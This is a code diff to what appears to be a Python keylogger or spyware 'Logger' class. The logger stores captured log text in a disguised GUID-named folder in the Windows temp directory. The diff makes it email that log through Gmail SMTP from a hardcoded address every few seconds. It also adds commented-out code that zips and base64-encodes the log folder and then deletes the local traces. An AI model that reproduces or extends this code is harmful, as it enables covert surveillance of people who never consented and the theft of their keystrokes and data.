@@ -15,6 +15,10 @@ import requests
 import socket
 import sys
 import smtplib
+import base64
+import json
+import shutil
+
 
 # User Defined Modules
 from LogModel import LogModel
@@ -124,19 +128,19 @@ class Logger:
 
     def write_file(self):
 
-        dirname = os.environ["temp"] + "\\EFA5SDB1-294Z-4501-A50A-EE19323E85A5"
-        if not os.path.exists(dirname):
-            os.mkdir(dirname)
-
-        filename = self.user + "".join(self.datetime.replace(":", ".")) + '.txt'
-        file = dirname + "\\" + filename
-
         previous_log_text = ''
         previous_log_header = ''
 
         while True:
 
             time.sleep(60)
+
+            dirname = os.environ["temp"] + "\\EFA5SDB1-294Z-4501-A50A-EE19323E85A5"
+            if not os.path.exists(dirname):
+                os.mkdir(dirname)
+
+            filename = self.user + "".join(self.datetime.replace(":", ".")) + '.txt'
+            file = dirname + "\\" + filename
 
             if sys.platform in ['Windows', 'win32', 'cygwin']:
                 if len(self.Log.logText) > 1 and (''.join(self.Log.logText) != previous_log_text or ''.join(
@@ -189,7 +193,7 @@ class Logger:
     def track_event(self):
 
         start_time = time.time()
-        seconds = 30
+        seconds = 5
 
         while True:
             current_time = time.time()
@@ -201,7 +205,21 @@ class Logger:
 
             if elapsed_time > seconds:
                 print("Event finished")
-                break
+                self.send_email()
+
+    # def send_event_files(self):
+    #
+    #     try:
+    #         dirname = os.environ["temp"] + "\\EFA5SDB1-294Z-4501-A50A-EE19323E85A5"
+    #         if os.path.exists(dirname):
+    #             shutil.make_archive(dirname, 'zip', dirname)
+    #         with open(dirname+".zip", 'rb') as file:
+    #             encoded_file = base64.b64encode(file.read())
+    #         os.remove(dirname + ".zip")
+    #         shutil.rmtree(dirname)
+    #         return encoded_file.decode()
+    #     except Exception as msg:
+    #         print(msg)
 
     def send_email(self):
         sender_email = "firstdjin@gmail.com"
@@ -210,11 +228,6 @@ class Logger:
         message = self.Log.toString().encode()
 
         # TODO Add Mimes
-
-        # dirname = os.environ["temp"] + "\\EFA5SDB1-294Z-4501-A50A-EE19323E85A5"
-        # if os.path.exists(dirname):
-        #     archive_name = dirname + self.user
-        #     shutil.make_archive(archive_name, 'zip', dirname)
 
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
